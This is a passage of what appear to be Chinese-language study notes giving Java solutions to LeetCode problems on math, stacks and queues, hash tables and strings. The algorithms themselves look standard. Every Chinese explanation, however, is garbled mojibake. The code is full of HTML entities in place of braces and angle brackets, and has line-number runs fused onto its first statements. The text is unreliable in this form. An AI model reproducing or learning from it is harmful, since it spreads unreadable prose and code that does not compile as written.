ç¬¦å·å³ç§»ï¼Œå·¦è¾¹å¡« 0 &#125; return sb.reverse().toString();&#125; 26 è¿›åˆ¶ 168. Excel Sheet Column Title (Easy) 12345671 -&gt; A2 -&gt; B3 -&gt; C...26 -&gt; Z27 -&gt; AA28 -&gt; AB å› ä¸ºæ˜¯ä» 1 å¼€å§‹è®¡ç®—çš„ï¼Œè€Œä¸æ˜¯ä» 0 å¼€å§‹ï¼Œå› æ­¤éœ€è¦å¯¹ n æ‰§è¡Œ -1 æ“ä½œã€‚ 1234567public String convertToTitle(int n) &#123; if (n == 0) &#123; return ""; &#125; n--; return convertToTitle(n / 26) + (char) (n % 26 + 'A');&#125; é˜¶ä¹˜ç»Ÿè®¡é˜¶ä¹˜å°¾éƒ¨æœ‰å¤šå°‘ä¸ª 0 172. Factorial Trailing Zeroes (Easy) å°¾éƒ¨çš„ 0 ç”± 2 * 5 å¾—æ¥ï¼Œ2 çš„æ•°é‡æ˜æ˜¾å¤šäº 5 çš„æ•°é‡ï¼Œå› æ­¤åªè¦ç»Ÿè®¡æœ‰å¤šå°‘ä¸ª 5 å³å¯ã€‚ å¯¹äºä¸€ä¸ªæ•° Nï¼Œå®ƒæ‰€åŒ…å« 5 çš„ä¸ªæ•°ä¸ºï¼šN/5 + N/52 + N/53 + â€¦ï¼Œå…¶ä¸­ N/5 è¡¨ç¤ºä¸å¤§äº N çš„æ•°ä¸­ 5 çš„å€æ•°è´¡çŒ®ä¸€ä¸ª 5ï¼ŒN/52 è¡¨ç¤ºä¸å¤§äº N çš„æ•°ä¸­ 52 çš„å€æ•°å†è´¡çŒ®ä¸€ä¸ª 5 â€¦ã€‚ 123public int trailingZeroes(int n) &#123; return n == 0 ? 0 : n / 5 + trailingZeroes(n / 5);&#125; å¦‚æœç»Ÿè®¡çš„æ˜¯ N! çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­æœ€ä½ä½ 1 çš„ä½ç½®ï¼Œåªè¦ç»Ÿè®¡æœ‰å¤šå°‘ä¸ª 2 å³å¯ï¼Œè¯¥é¢˜ç›®å‡ºè‡ª ç¼–ç¨‹ä¹‹ç¾ï¼š2.2 ã€‚å’Œæ±‚è§£æœ‰å¤šå°‘ä¸ª 5 ä¸€æ ·ï¼Œ2 çš„ä¸ªæ•°ä¸º N/2 + N/22 + N/23 + â€¦ å­—ç¬¦ä¸²åŠ æ³•å‡æ³•äºŒè¿›åˆ¶åŠ æ³• 67. Add Binary (Easy) 123a = "11"b = "1"Return "100". 123456789101112131415public String addBinary(String a, String b) &#123; int i = a.length() - 1, j = b.length() - 1, carry = 0; StringBuilder str = new StringBuilder(); while (carry == 1 || i &gt;= 0 || j &gt;= 0) &#123; if (i &gt;= 0 &amp;&amp; a.charAt(i--) == '1') &#123; carry++; &#125; if (j &gt;= 0 &amp;&amp; b.charAt(j--) == '1') &#123; carry++; &#125; str.append(carry % 2); carry /= 2; &#125; return str.reverse().toString();&#125; å­—ç¬¦ä¸²åŠ æ³• 415. Add Strings (Easy) å­—ç¬¦ä¸²çš„å€¼ä¸ºéè´Ÿæ•´æ•°ã€‚ 1234567891011public String addStrings(String num1, String num2) &#123; StringBuilder str = new StringBuilder(); int carry = 0, i = num1.length() - 1, j = num2.length() - 1; while (carry == 1 || i &gt;= 0 || j &gt;= 0) &#123; int x = i &lt; 0 ? 0 : num1.charAt(i--) - '0'; int y = j &lt; 0 ? 0 : num2.charAt(j--) - '0'; str.append((x + y + carry) % 10); carry = (x + y + carry) / 10; &#125; return str.reverse().toString();&#125; ç›¸é‡é—®é¢˜æ”¹å˜æ•°ç»„å…ƒç´ ä½¿æ‰€æœ‰çš„æ•°ç»„å…ƒç´ éƒ½ç›¸ç­‰ 462. Minimum Moves to Equal Array Elements II (Medium) 12345678910Input:[1,2,3]Output:2Explanation:Only two moves are needed (remember each move increments or decrements one element):[1,2,3] =&gt; [2,2,3] =&gt; [2,2,2] æ¯æ¬¡å¯ä»¥å¯¹ä¸€ä¸ªæ•°ç»„å…ƒç´ åŠ ä¸€æˆ–è€…å‡ä¸€ï¼Œæ±‚æœ€å°çš„æ”¹å˜æ¬¡æ•°ã€‚ è¿™æ˜¯ä¸ªå…¸å‹çš„ç›¸é‡é—®é¢˜ï¼Œç§»åŠ¨è·ç¦»æœ€å°çš„æ–¹å¼æ˜¯æ‰€æœ‰å…ƒç´ éƒ½ç§»åŠ¨åˆ°ä¸­ä½æ•°ã€‚ç†ç”±å¦‚ä¸‹ï¼š è®¾ m ä¸ºä¸­ä½æ•°ã€‚a å’Œ b æ˜¯ m ä¸¤è¾¹çš„ä¸¤ä¸ªå…ƒç´ ï¼Œä¸” b &gt; aã€‚è¦ä½¿ a å’Œ b ç›¸ç­‰ï¼Œå®ƒä»¬æ€»å…±ç§»åŠ¨çš„æ¬¡æ•°ä¸º b - aï¼Œè¿™ä¸ªå€¼ç­‰äº (b - m) + (m - a)ï¼Œä¹Ÿå°±æ˜¯æŠŠè¿™ä¸¤ä¸ªæ•°ç§»åŠ¨åˆ°ä¸­ä½æ•°çš„ç§»åŠ¨æ¬¡æ•°ã€‚ è®¾æ•°ç»„é•¿åº¦ä¸º Nï¼Œåˆ™å¯ä»¥æ‰¾åˆ° N/2 å¯¹ a å’Œ b çš„ç»„åˆï¼Œä½¿å®ƒä»¬éƒ½ç§»åŠ¨åˆ° m çš„ä½ç½®ã€‚ è§£æ³• 1 å…ˆæ’åºï¼Œæ—¶é—´å¤æ‚åº¦ï¼šO(NlogN) 1234567891011public int minMoves2(int[] nums) &#123; Arrays.sort(nums); int move = 0; int l = 0, h = nums.length - 1; while (l &lt;= h) &#123; move += nums[h] - nums[l]; l++; h--; &#125; return move;&#125; è§£æ³• 2 ä½¿ç”¨å¿«é€Ÿé€‰æ‹©æ‰¾åˆ°ä¸­ä½æ•°ï¼Œæ—¶é—´å¤æ‚åº¦ O(N) 1234567891011121314151617181920212223242526272829303132333435363738394041424344public int minMoves2(int[] nums) &#123; int move = 0; int median = findKthSmallest(nums, nums.length / 2); for (int num : nums) &#123; move += Math.abs(num - median); &#125; return move;&#125;private int findKthSmallest(int[] nums, int k) &#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int j = partition(nums, l, h); if (j == k) &#123; break; &#125; if (j &lt; k) &#123; l = j + 1; &#125; else &#123; h = j - 1; &#125; &#125; return nums[k];&#125;private int partition(int[] nums, int l, int h) &#123; int i = l, j = h + 1; while (true) &#123; while (nums[++i] &lt; nums[l] &amp;&amp; i &lt; h) ; while (nums[--j] &gt; nums[l] &amp;&amp; j &gt; l) ; if (i &gt;= j) &#123; break; &#125; swap(nums, i, j); &#125; swap(nums, l, j); return j;&#125;private void swap(int[] nums, int i, int j) &#123; int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp;&#125; å¤šæ•°æŠ•ç¥¨é—®é¢˜æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°å¤šäº n / 2 çš„å…ƒç´  169. Majority Element (Easy) å…ˆå¯¹æ•°ç»„æ’åºï¼Œæœ€ä¸­é—´é‚£ä¸ªæ•°å‡ºç°æ¬¡æ•°ä¸€å®šå¤šäº n / 2ã€‚ 1234public int majorityElement(int[] nums) &#123; Arrays.sort(nums); return nums[nums.length / 2];&#125; å¯ä»¥åˆ©ç”¨ Boyer-Moore Majority Vote Algorithm æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½¿å¾—æ—¶é—´å¤æ‚åº¦ä¸º O(N)ã€‚å¯ä»¥è¿™ä¹ˆç†è§£è¯¥ç®—æ³•ï¼šä½¿ç”¨ cnt æ¥ç»Ÿè®¡ä¸€ä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œå½“éå†åˆ°çš„å…ƒç´ å’Œç»Ÿè®¡å…ƒç´ ä¸ç›¸ç­‰æ—¶ï¼Œä»¤ cntâ€“ã€‚å¦‚æœå‰é¢æŸ¥æ‰¾äº† i ä¸ªå…ƒç´ ï¼Œä¸” cnt == 0ï¼Œè¯´æ˜å‰ i ä¸ªå…ƒç´ æ²¡æœ‰ majorityï¼Œæˆ–è€…æœ‰ majorityï¼Œä½†æ˜¯å‡ºç°çš„æ¬¡æ•°å°‘äº i / 2ï¼Œå› ä¸ºå¦‚æœå¤šäº i / 2 çš„è¯ cnt å°±ä¸€å®šä¸ä¼šä¸º 0ã€‚æ­¤æ—¶å‰©ä¸‹çš„ n - i ä¸ªå…ƒç´ ä¸­ï¼Œmajority çš„æ•°ç›®ä¾ç„¶å¤šäº (n - i) / 2ï¼Œå› æ­¤ç»§ç»­æŸ¥æ‰¾å°±èƒ½æ‰¾å‡º majorityã€‚ 12345678public int majorityElement(int[] nums) &#123; int cnt = 0, majority = nums[0]; for (int num : nums) &#123; majority = (cnt == 0) ? num : majority; cnt = (majority == num) ? cnt + 1 : cnt - 1; &#125; return majority;&#125; å…¶å®ƒå¹³æ–¹æ•° 367. Valid Perfect Square (Easy) 12Input: 16Returns: True å¹³æ–¹åºåˆ—ï¼š1,4,9,16,.. é—´éš”ï¼š3,5,7,â€¦ é—´éš”ä¸ºç­‰å·®æ•°åˆ—ï¼Œä½¿ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥å¾—åˆ°ä» 1 å¼€å§‹çš„å¹³æ–¹åºåˆ—ã€‚ 12345678public boolean isPerfectSquare(int num) &#123; int subNum = 1; while (num &gt; 0) &#123; num -= subNum; subNum += 2; &#125; return num == 0;&#125; 3 çš„ n æ¬¡æ–¹ 326. Power of Three (Easy) 123public boolean isPowerOfThree(int n) &#123; return n &gt; 0 &amp;&amp; (1162261467 % n == 0);&#125; ä¹˜ç§¯æ•°ç»„ 238. Product of Array Except Self (Medium) 1For example, given [1,2,3,4], return [24,12,8,6]. ç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œåˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œæ–°æ•°ç»„çš„æ¯ä¸ªå…ƒç´ ä¸ºåŸå§‹æ•°ç»„ä¸­é™¤äº†è¯¥ä½ç½®ä¸Šçš„å…ƒç´ ä¹‹å¤–æ‰€æœ‰å…ƒç´ çš„ä¹˜ç§¯ã€‚ è¦æ±‚æ—¶é—´å¤æ‚åº¦ä¸º O(N)ï¼Œå¹¶ä¸”ä¸èƒ½ä½¿ç”¨é™¤æ³•ã€‚ 12345678910111213141516public int[] productExceptSelf(int[] nums) &#123; int n = nums.length; int[] products = new int[n]; Arrays.fill(products, 1); int left = 1; for (int i = 1; i &lt; n; i++) &#123; left *= nums[i - 1]; products[i] *= left; &#125; int right = 1; for (int i = n - 2; i &gt;= 0; i--) &#123; right *= nums[i + 1]; products[i] *= right; &#125; return products;&#125; æ‰¾å‡ºæ•°ç»„ä¸­çš„ä¹˜ç§¯æœ€å¤§çš„ä¸‰ä¸ªæ•° 628. Maximum Product of Three Numbers (Easy) 12Input: [1,2,3,4]Output: 24 1234567891011121314151617181920212223public int maximumProduct(int[] nums) &#123; int max1 = Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE, min1 = Integer.MAX_VALUE, min2 = Integer.MAX_VALUE; for (int n : nums) &#123; if (n &gt; max1) &#123; max3 = max2; max2 = max1; max1 = n; &#125; else if (n &gt; max2) &#123; max3 = max2; max2 = n; &#125; else if (n &gt; max3) &#123; max3 = n; &#125; if (n &lt; min1) &#123; min2 = min1; min1 = n; &#125; else if (n &lt; min2) &#123; min2 = n; &#125; &#125; return Math.max(max1*max2*max3, max1*min1*min2);&#125; æ•°æ®ç»“æ„ç›¸å…³æ ˆå’Œé˜Ÿåˆ—ç”¨æ ˆå®ç°é˜Ÿåˆ— 232. Implement Queue using Stacks (Easy) 12345678910111213141516171819202122232425262728293031class MyQueue &#123; private Stack&lt;Integer&gt; in = new Stack&lt;&gt;(); private Stack&lt;Integer&gt; out = new Stack&lt;&gt;(); public void push(int x) &#123; in.push(x); &#125; public int pop() &#123; in2out(); return out.pop(); &#125; public int peek() &#123; in2out(); return out.peek(); &#125; private void in2out() &#123; if (out.isEmpty()) &#123; while (!in.isEmpty()) &#123; out.push(in.pop()); &#125; &#125; &#125; public boolean empty() &#123; return in.isEmpty() &amp;&amp; out.isEmpty(); &#125;&#125; ç”¨é˜Ÿåˆ—å®ç°æ ˆ 225. Implement Stack using Queues (Easy) åœ¨å°†ä¸€ä¸ªå…ƒç´  x æ’å…¥é˜Ÿåˆ—æ—¶ï¼Œéœ€è¦è®©é™¤äº† x ä¹‹å¤–çš„æ‰€æœ‰å…ƒç´ å‡ºé˜Ÿåˆ—ï¼Œå†å…¥é˜Ÿåˆ—ã€‚æ­¤æ—¶ x åœ¨é˜Ÿé¦–ï¼Œç¬¬ä¸€ä¸ªå‡ºé˜Ÿåˆ—ï¼Œå®ç°äº†åè¿›å…ˆå‡ºé¡ºåºã€‚ 12345678910111213141516171819202122232425262728class MyStack &#123; private Queue&lt;Integer&gt; queue; public MyStack() &#123; queue = new LinkedList&lt;&gt;(); &#125; public void push(int x) &#123; queue.add(x); int cnt = queue.size(); while (cnt-- &gt; 1) &#123; queue.add(queue.poll()); &#125; &#125; public int pop() &#123; return queue.remove(); &#125; public int top() &#123; return queue.peek(); &#125; public boolean empty() &#123; return queue.isEmpty(); &#125;&#125; æœ€å°å€¼æ ˆ 155. Min Stack (Easy) 1234567891011121314151617181920212223242526272829303132class MinStack &#123; private Stack&lt;Integer&gt; dataStack; private Stack&lt;Integer&gt; minStack; private int min; public MinStack() &#123; dataStack = new Stack&lt;&gt;(); minStack = new Stack&lt;&gt;(); min = Integer.MAX_VALUE; &#125; public void push(int x) &#123; dataStack.add(x); min = Math.min(min, x); minStack.add(min); &#125; public void pop() &#123; dataStack.pop(); minStack.pop(); min = minStack.isEmpty() ? Integer.MAX_VALUE : minStack.peek(); &#125; public int top() &#123; return dataStack.peek(); &#125; public int getMin() &#123; return minStack.peek(); &#125;&#125; å¯¹äºå®ç°æœ€å°å€¼é˜Ÿåˆ—é—®é¢˜ï¼Œå¯ä»¥å…ˆå°†é˜Ÿåˆ—ä½¿ç”¨æ ˆæ¥å®ç°ï¼Œç„¶åå°±å°†é—®é¢˜è½¬æ¢ä¸ºæœ€å°å€¼æ ˆï¼Œè¿™ä¸ªé—®é¢˜å‡ºç°åœ¨ ç¼–ç¨‹ä¹‹ç¾ï¼š3.7ã€‚ ç”¨æ ˆå®ç°æ‹¬å·åŒ¹é… 20. Valid Parentheses (Easy) 123"()[]&#123;&#125;"Output : true 1234567891011121314151617181920public boolean isValid(String s) &#123; Stack&lt;Character&gt; stack = new Stack&lt;&gt;(); for (char c : s.toCharArray()) &#123; if (c == '(' || c == '&#123;' || c == '[') &#123; stack.push(c); &#125; else &#123; if (stack.isEmpty()) &#123; return false; &#125; char cStack = stack.pop(); boolean b1 = c == ')' &amp;&amp; cStack != '('; boolean b2 = c == ']' &amp;&amp; cStack != '['; boolean b3 = c == '&#125;' &amp;&amp; cStack != '&#123;'; if (b1 || b2 || b3) &#123; return false; &#125; &#125; &#125; return stack.isEmpty();&#125; æ•°ç»„ä¸­å…ƒç´ ä¸ä¸‹ä¸€ä¸ªæ¯”å®ƒå¤§çš„å…ƒç´ ä¹‹é—´çš„è·ç¦» 739. Daily Temperatures (Medium) 12Input: [73, 74, 75, 71, 69, 72, 76, 73]Output: [1, 1, 4, 2, 1, 1, 0, 0] åœ¨éå†æ•°ç»„æ—¶ç”¨ Stack æŠŠæ•°ç»„ä¸­çš„æ•°å­˜èµ·æ¥ï¼Œå¦‚æœå½“å‰éå†çš„æ•°æ¯”æ ˆé¡¶å…ƒç´ æ¥çš„å¤§ï¼Œè¯´æ˜æ ˆé¡¶å…ƒç´ çš„ä¸‹ä¸€ä¸ªæ¯”å®ƒå¤§çš„æ•°å°±æ˜¯å½“å‰å…ƒç´ ã€‚ 12345678910111213public int[] dailyTemperatures(int[] temperatures) &#123; int n = temperatures.length; int[] dist = new int[n]; Stack&lt;Integer&gt; indexs = new Stack&lt;&gt;(); for (int curIndex = 0; curIndex &lt; n; curIndex++) &#123; while (!indexs.isEmpty() &amp;&amp; temperatures[curIndex] &gt; temperatures[indexs.peek()]) &#123; int preIndex = indexs.pop(); dist[preIndex] = curIndex - preIndex; &#125; indexs.add(curIndex); &#125; return dist;&#125; å¾ªç¯æ•°ç»„ä¸­æ¯”å½“å‰å…ƒç´ å¤§çš„ä¸‹ä¸€ä¸ªå…ƒç´  503. Next Greater Element II (Medium) 12345Input: [1,2,1]Output: [2,-1,2]Explanation: The first 1&apos;s next greater number is 2; The number 2 can&apos;t find next greater number; The second 1&apos;s next greater number needs to search circularly, which is also 2. ä¸ 739. Daily Temperatures (Medium) ä¸åŒçš„æ˜¯ï¼Œæ•°ç»„æ˜¯å¾ªç¯æ•°ç»„ï¼Œå¹¶ä¸”æœ€åè¦æ±‚çš„ä¸æ˜¯è·ç¦»è€Œæ˜¯ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚ 12345678910111213141516public int[] nextGreaterElements(int[] nums) &#123; int n = nums.length; int[] next = new int[n]; Arrays.fill(next, -1); Stack&lt;Integer&gt; pre = new Stack&lt;&gt;(); for (int i = 0; i &lt; n * 2; i++) &#123; int num = nums[i % n]; while (!pre.isEmpty() &amp;&amp; nums[pre.peek()] &lt; num) &#123; next[pre.pop()] = num; &#125; if (i &lt; n)&#123; pre.push(i); &#125; &#125; return next;&#125; å“ˆå¸Œè¡¨å“ˆå¸Œè¡¨ä½¿ç”¨ O(N) ç©ºé—´å¤æ‚åº¦å­˜å‚¨æ•°æ®ï¼Œä»è€Œèƒ½å¤Ÿä»¥ O(1) æ—¶é—´å¤æ‚åº¦æ±‚è§£é—®é¢˜ã€‚ Java ä¸­çš„ HashSet ç”¨äºå­˜å‚¨ä¸€ä¸ªé›†åˆï¼Œå¯ä»¥æŸ¥æ‰¾å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­ã€‚ å¦‚æœå…ƒç´ æœ‰ç©·ï¼Œå¹¶ä¸”èŒƒå›´ä¸å¤§ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ä¸€ä¸ªå¸ƒå°”æ•°ç»„æ¥å­˜å‚¨ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨ã€‚ä¾‹å¦‚å¯¹äºåªæœ‰å°å†™å­—ç¬¦çš„å…ƒç´ ï¼Œå°±å¯ä»¥ç”¨ä¸€ä¸ªé•¿åº¦ä¸º 26 çš„å¸ƒå°”æ•°ç»„æ¥å­˜å‚¨ä¸€ä¸ªå­—ç¬¦é›†åˆï¼Œä½¿å¾—ç©ºé—´å¤æ‚åº¦é™ä½ä¸º O(1)ã€‚ Java ä¸­çš„ HashMap ä¸»è¦ç”¨äºæ˜ å°„å…³ç³»ï¼Œä»è€ŒæŠŠä¸¤ä¸ªå…ƒç´ è”ç³»èµ·æ¥ã€‚ åœ¨å¯¹ä¸€ä¸ªå†…å®¹è¿›è¡Œå‹ç¼©æˆ–è€…å…¶å®ƒè½¬æ¢æ—¶ï¼Œåˆ©ç”¨ HashMap å¯ä»¥æŠŠåŸå§‹å†…å®¹å’Œè½¬æ¢åçš„å†…å®¹è”ç³»èµ·æ¥ã€‚ä¾‹å¦‚åœ¨ä¸€ä¸ªç®€åŒ– url çš„ç³»ç»Ÿä¸­Leetcdoe : 535. Encode and Decode TinyURL (Medium)ï¼Œåˆ©ç”¨ HashMap å°±å¯ä»¥å­˜å‚¨ç²¾ç®€åçš„ url åˆ°åŸå§‹ url çš„æ˜ å°„ï¼Œä½¿å¾—ä¸ä»…å¯ä»¥æ˜¾ç¤ºç®€åŒ–çš„ urlï¼Œä¹Ÿå¯ä»¥æ ¹æ®ç®€åŒ–çš„ url å¾—åˆ°åŸå§‹ url ä»è€Œå®šä½åˆ°æ­£ç¡®çš„èµ„æºã€‚ HashMap ä¹Ÿå¯ä»¥ç”¨æ¥å¯¹å…ƒç´ è¿›è¡Œè®¡æ•°ç»Ÿè®¡ï¼Œæ­¤æ—¶é”®ä¸ºå…ƒç´ ï¼Œå€¼ä¸ºè®¡æ•°ã€‚å’Œ HashSet ç±»ä¼¼ï¼Œå¦‚æœå…ƒç´ æœ‰ç©·å¹¶ä¸”èŒƒå›´ä¸å¤§ï¼Œå¯ä»¥ç”¨æ•´å‹æ•°ç»„æ¥è¿›è¡Œç»Ÿè®¡ã€‚ æ•°ç»„ä¸­çš„ä¸¤ä¸ªæ•°å’Œä¸ºç»™å®šå€¼ 1. Two Sum (Easy) å¯ä»¥å…ˆå¯¹æ•°ç»„è¿›è¡Œæ’åºï¼Œç„¶åä½¿ç”¨åŒæŒ‡é’ˆæ–¹æ³•æˆ–è€…äºŒåˆ†æŸ¥æ‰¾æ–¹æ³•ã€‚è¿™æ ·åšçš„æ—¶é—´å¤æ‚åº¦ä¸º O(NlogN)ï¼Œç©ºé—´å¤æ‚åº¦ä¸º O(1)ã€‚ ç”¨ HashMap å­˜å‚¨æ•°ç»„å…ƒç´ å’Œç´¢å¼•çš„æ˜ å°„ï¼Œåœ¨è®¿é—®åˆ° nums[i] æ—¶ï¼Œåˆ¤æ–­ HashMap ä¸­æ˜¯å¦å­˜åœ¨ target - nums[i]ï¼Œå¦‚æœå­˜åœ¨è¯´æ˜ target - nums[i] æ‰€åœ¨çš„ç´¢å¼•å’Œ i å°±æ˜¯è¦æ‰¾çš„ä¸¤ä¸ªæ•°ã€‚è¯¥æ–¹æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(N)ï¼Œç©ºé—´å¤æ‚åº¦ä¸º O(N)ï¼Œä½¿ç”¨ç©ºé—´æ¥æ¢å–æ—¶é—´ã€‚ 1234567891011public int[] twoSum(int[] nums, int target) &#123; HashMap&lt;Integer, Integer&gt; indexForNum = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; if (indexForNum.containsKey(target - nums[i])) &#123; return new int[]&#123;indexForNum.get(target - nums[i]), i&#125;; &#125; else &#123; indexForNum.put(nums[i], i); &#125; &#125; return null;&#125; åˆ¤æ–­æ•°ç»„æ˜¯å¦å«æœ‰é‡å¤å…ƒç´  217. Contains Duplicate (Easy) 1234567public boolean containsDuplicate(int[] nums) &#123; Set&lt;Integer&gt; set = new HashSet&lt;&gt;(); for (int num : nums) &#123; set.add(num); &#125; return set.size() &lt; nums.length;&#125; æœ€é•¿å’Œè°åºåˆ— 594. Longest Harmonious Subsequence (Easy) 123Input: [1,3,2,2,5,2,3,7]Output: 5Explanation: The longest harmonious subsequence is [3,2,2,2,3]. å’Œè°åºåˆ—ä¸­æœ€å¤§æ•°å’Œæœ€å°æ•°åªå·®æ­£å¥½ä¸º 1ï¼Œåº”è¯¥æ³¨æ„çš„æ˜¯åºåˆ—çš„å…ƒç´ ä¸ä¸€å®šæ˜¯æ•°ç»„çš„è¿ç»­å…ƒç´ ã€‚ 12345678910111213public int findLHS(int[] nums) &#123; Map&lt;Integer, Integer&gt; countForNum = new HashMap&lt;&gt;(); for (int num : nums) &#123; countForNum.put(num, countForNum.getOrDefault(num, 0) + 1); &#125; int longest = 0; for (int num : countForNum.keySet()) &#123; if (countForNum.containsKey(num + 1)) &#123; longest = Math.max(longest, countForNum.get(num + 1) + countForNum.get(num)); &#125; &#125; return longest;&#125; æœ€é•¿è¿ç»­åºåˆ— 128. Longest Consecutive Sequence (Hard) 12Given [100, 4, 200, 1, 3, 2],The longest consecutive elements sequence is [1, 2, 3, 4]. Return its length: 4. è¦æ±‚ä»¥ O(N) çš„æ—¶é—´å¤æ‚åº¦æ±‚è§£ã€‚ 12345678910111213141516171819202122232425262728293031public int longestConsecutive(int[] nums) &#123; Map&lt;Integer, Integer&gt; countForNum = new HashMap&lt;&gt;(); for (int num : nums) &#123; countForNum.put(num, 1); &#125; for (int num : nums) &#123; forward(countForNum, num); &#125; return maxCount(countForNum);&#125;private int forward(Map&lt;Integer, Integer&gt; countForNum, int num) &#123; if (!countForNum.containsKey(num)) &#123; return 0; &#125; int cnt = countForNum.get(num); if (cnt &gt; 1) &#123; return cnt; &#125; cnt = forward(countForNum, num + 1) + 1; countForNum.put(num, cnt); return cnt;&#125;private int maxCount(Map&lt;Integer, Integer&gt; countForNum) &#123; int max = 0; for (int num : countForNum.keySet()) &#123; max = Math.max(max, countForNum.get(num)); &#125; return max;&#125; å­—ç¬¦ä¸²ä¸¤ä¸ªå­—ç¬¦ä¸²åŒ…å«çš„å­—ç¬¦æ˜¯å¦å®Œå…¨ç›¸åŒ 242. Valid Anagram (Easy) 12s = "anagram", t = "nagaram", return true.s = "rat", t = "car", return false. å­—ç¬¦ä¸²åªåŒ…å«å°å†™å­—ç¬¦ï¼Œæ€»å…±æœ‰ 26 ä¸ªå°å†™å­—ç¬¦ã€‚å¯ä»¥ç”¨ HashMap æ¥æ˜ å°„å­—ç¬¦ä¸å‡ºç°æ¬¡æ•°ã€‚å› ä¸ºé”®çš„èŒƒå›´å¾ˆå°ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨é•¿åº¦ä¸º 26 çš„æ•´å‹æ•°ç»„å¯¹å­—ç¬¦ä¸²å‡ºç°çš„å­—ç¬¦è¿›è¡Œç»Ÿè®¡ï¼Œç„¶åæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²å‡ºç°çš„å­—ç¬¦æ•°é‡æ˜¯å¦ç›¸åŒã€‚ 123456789101112131415public boolean isAnagram(String s, String t) &#123; int[] cnts = new int[26]; for (char c : s.toCharArray()) &#123; cnts[c - 'a']++; &#125; for (char c : t.toCharArray()) &#123; cnts[c - 'a']--; &#125; for (int cnt : cnts) &#123; if (cnt != 0) &#123; return false; &#125; &#125; return true;&#125; è®¡ç®—ä¸€ç»„å­—ç¬¦é›†åˆå¯ä»¥ç»„æˆçš„å›æ–‡å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ 409. Longest Palindrome (Easy) 123Input : "abccccdd"Output : 7Explanation : One longest palindrome that can be built is "dccaccd", whose length is 7. ä½¿ç”¨é•¿åº¦ä¸º 256 çš„æ•´å‹æ•°ç»„æ¥ç»Ÿè®¡æ¯ä¸ªå­—ç¬¦å‡ºç°çš„ä¸ªæ•°ï¼Œæ¯ä¸ªå­—ç¬¦æœ‰å¶æ•°ä¸ªå¯ä»¥ç”¨æ¥æ„æˆå›æ–‡å­—ç¬¦ä¸²ã€‚ å› ä¸ºå›æ–‡å­—ç¬¦ä¸²æœ€ä¸­é—´çš„é‚£ä¸ªå­—ç¬¦å¯ä»¥å•ç‹¬å‡ºç°ï¼Œæ‰€ä»¥å¦‚æœæœ‰å•ç‹¬çš„å­—ç¬¦å°±æŠŠå®ƒæ”¾åˆ°æœ€ä¸­é—´ã€‚ 1234567891011121314public int longestPalindrome(String s) &#123; int[] cnts = new int[256]; for (char c : s.toCharArray()) &#123; cnts[c]++; &#125; int palindrome = 0; for (int cnt : cnts) &#123; palindrome += (cnt / 2) * 2; &#125; if (palindrome &lt; s.length()) &#123; palindrome++; // è¿™ä¸ªæ¡ä»¶ä¸‹ s ä¸­ä¸€å®šæœ‰å•ä¸ªæœªä½¿ç”¨çš„å­—ç¬¦å­˜åœ¨ï¼Œå¯ä»¥æŠŠè¿™ä¸ªå­—ç¬¦æ”¾åˆ°å›æ–‡çš„æœ€ä¸­é—´ &#125; return palindrome;&#125; å­—ç¬¦ä¸²åŒæ„ 205. Isomorphic Strings (Easy) 123Given "egg", "add", return true.Given "foo", "bar", return false.Given "paper", "title", return true. è®°å½•ä¸€ä¸ªå­—ç¬¦ä¸Šæ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ä¸Šæ¬¡å‡ºç°çš„ä½ç½®ä¸€æ ·ï¼Œé‚£ä¹ˆå°±å±äºåŒæ„ã€‚ 12345678910111213public boolean isIsomorphic(String s, String t) &#123; int[] preIndexOfS = new int[256]; int[] preIndexOfT = new int[256]; for (int i = 0; i &lt; s.length(); i++) &#123; char sc = s.charAt(i), tc = t.charAt(i); if (preIndexOfS[sc] != preIndexOfT[tc]) &#123; return false; &#125; preIndexOfS[sc] = i + 1; preIndexOfT[tc] = i + 1; &#125; return true;&#125; å›æ–‡å­å­—ç¬¦ä¸² 647. Palindromic Substrings (Medium) 123Input: "aaa"Output: 6Explanation: Six palindromic strings: "a", "a", "a", "aa", "aa", "aaa". ä»å­—ç¬¦ä¸²çš„æŸä¸€ä½å¼€å§‹ï¼Œå°è¯•ç€å»æ‰©å±•å­å­—ç¬¦ä¸²ã€‚ 1234567891011121314151617private int cnt = 0;public int countSubstrings(String s) &#123; for (int i = 0; i &lt; s.length(); i++) &#123; extendSubstrings(s, i, i); // å¥‡æ•°é•¿åº¦ extendSubstrings(s, i, i + 1); // å¶æ•°é•¿åº¦ &#125; return cnt;&#125;private void extendSubstrings(String s, int start, int end) &#123; while (start &gt;= 0 &amp;&amp; end &lt; s.length() &amp;&amp; s.charAt(start) == s.charAt(end)) &#123; start--; end++; cnt++; &#125;&#125; åˆ¤æ–­ä¸€ä¸ªæ•´æ•°æ˜¯å¦æ˜¯å›æ–‡æ•° 9. Palindrome Number (Easy) è¦æ±‚ä¸èƒ½ä½¿ç”¨é¢å¤–ç©ºé—´ï¼Œä¹Ÿå°±ä¸èƒ½å°†æ•´æ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²è¿›è¡Œåˆ¤æ–­ã€‚ 